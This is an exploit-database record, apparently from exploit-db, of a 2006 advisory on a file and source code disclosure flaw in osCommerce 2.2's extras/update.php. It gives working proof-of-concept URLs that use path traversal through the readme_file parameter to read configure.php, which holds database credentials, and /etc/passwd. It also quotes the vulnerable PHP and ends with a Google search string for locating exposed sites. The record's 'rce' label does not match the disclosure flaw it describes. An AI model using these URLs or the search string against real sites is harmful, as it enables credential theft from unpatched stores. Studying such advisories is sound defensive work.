{
  "id": "1674",
  "title": "osCommerce 2.2 - &#039;extras&#039; Source Code Disclosure",
  "cve": null,
  "vuln_type": "rce",
  "code": "---- osCommerce <= 2.2 \"extras/\" information/source code disclosure ------------\r\n\r\nsoftware site: http://www.oscommerce.com/\r\n\r\n\r\nif extras/ folder is placed inside the www path, you can see all files on target\r\nsystem, including php source code with database details, poc:\r\n\r\nhttp://[target]/[path]/extras/update.php?read_me=0&readme_file=../catalog/includes/configure.php\r\nhttp://[target]/[path]/extras/update.php?read_me=0&readme_file=/etc/passwd\r\n\r\nthis is the vulnerable code in update.php:\r\n\r\n...\r\n\tinclude '../mysql.php';\r\n\t// if a readme.txt file exists, display it to the user\r\n\tif(!$read_me) {\r\n\t\tif(file_exists('readme.txt')) {\r\n\t\t\t$readme_file = 'readme.txt';\r\n\t\t}\r\n\t\telseif(file_exists('README')) {\r\n\t\t\t$readme_file = 'README';\r\n\t\t}\r\n\t\telseif(file_exists('readme')) {\r\n\t\t\t$readme_file = 'readme';\r\n\t\t}\r\n\t\tif($readme_file) {\r\n\t\t\t$readme = file($readme_file);\r\n\t\t\tprint \"<CENTER><TABLE BORDER=\\\"1\\\" WIDTH=\\\"75%\\\" CELLPADDING=\\\"2\\\" CELLSPACING=\\\"0\\\"><TR BGCOLOR=\\\"#e7e7cc\\\"><TD>\\n\";\r\n\t\t\tprint nl2br(htmlentities(implode($readme, ' ')));\r\n\t\t\tprint \"<HR NOSHADE SIZE=\\\"1\\\"><CENTER><A HREF=\\\"update.php?read_me=1\\\"><B>Continue</B></A></CENTER>\\n\";\r\n\t\t\tprint \"</TD></TR></TABLE>\\n\";\r\n\t\t\texit;\r\n\t\t}\r\n\t}\r\n...\r\n\r\ngoogle search:\r\n\r\ninurl:\"extras/update.php\" intext:mysql.php -display\r\n\r\n--------------------------------------------------------------------------------\r\nrgod\r\n\r\nsite: http://retrogod.altervista.org\r\nmail: rgod at autistici.org\r\noriginal advisory: http://retrogod.altervista.org/oscommerce_22_adv.html\r\n--------------------------------------------------------------------------------\r\n\r\n# milw0rm.com [2006-04-14]",
  "url": "https://www.exploit-db.com/exploits/1674"
}